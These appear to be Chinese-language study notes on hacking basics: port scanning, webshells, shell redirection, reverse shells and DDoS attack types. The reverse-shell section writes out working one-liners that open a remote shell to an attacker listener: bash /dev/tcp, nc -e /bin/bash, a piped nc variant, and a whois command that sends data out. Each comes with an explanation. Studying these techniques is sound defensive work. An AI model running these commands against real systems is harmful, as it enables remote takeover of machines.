

端口探测:掌握端口信息。对服务应用程序的指纹进行分析，主要包括版本号、已知的漏洞信息、常规配置信息、针对此应用流行的攻击方法
webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。

0 - stdin 代表标准输入。1 - stdout 代表标准输出。 2 - stderr 代表标准错误输出
当>&后面接文件时，表示将标准输出和标准错误输出重定向至文件。当>&后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符
cat notexistfile 2>1，会将1看作是一个文件，
cat notexistfile 2>&1,将标准错误输出输出到1这个文件里而不是标准输出,而&的作用就是为了区分文件和文件描述符,亦称“取地址符号”

端口反弹：多种语言都能实现(防火墙需要开放端口，默认是不开放的)
shell:
1.连接端：nc -lvp 7777
2.被连接端：bash -i >& /dev/tcp/192.168.3.107/7777 0>&1
  bash -i代表在本地当前shell打开另一个shell， /dev/tcp/(/dev/tcp/ip/port)是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用
  >&后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件,即传递到远程上 
  该命令后面加上0>&1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程

netcat: nc 127.0.0.1 80  连接到某主机的某端口
1.连接端：nc -lvp 7777
2.被连接端：nc -e /bin/bash 192.168.0.4 7777
  -e后面跟的参数代表的是在创建连接后执行的程序
  【nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777 管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的/bin/bash，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口】

1.连接端：nc -lvp 7777
2.被连接端：whois -h 192.168.118.119 -p 7777 `ifconfig`    #连接上后执行命令
  
python:  
php：  


DDOS（分布式拒绝服务）:ip攻击，处于不同位置的多个攻击者同时向一个或数个目标发动攻击，或者一个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击
CC攻击是DDOS的一种形式：网页攻击，访问页面
IP Spoofing：IP欺骗攻击是一种黑客通过向服务端发送虚假的包以欺骗服务器的，使服务器必需开启自己的监听端口不断等待，也就浪费了系统各方面的资源。
SYN floods：发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽
LAND attack：攻击包中的原地址和目标地址都是攻击对象的IP。这种攻击会导致被攻击的机器死循环，最终耗尽资源而死机
ICMP floods：ICMPfloods是通过向未良好设置的路由器发送广播信息占用系统资源的做法。
Application level floods主要是针对应用软件层的


硬件防火墙是指把防火墙程序做到芯片里面，由硬件执行这些功能，能减少CPU的负担，使路由更稳定












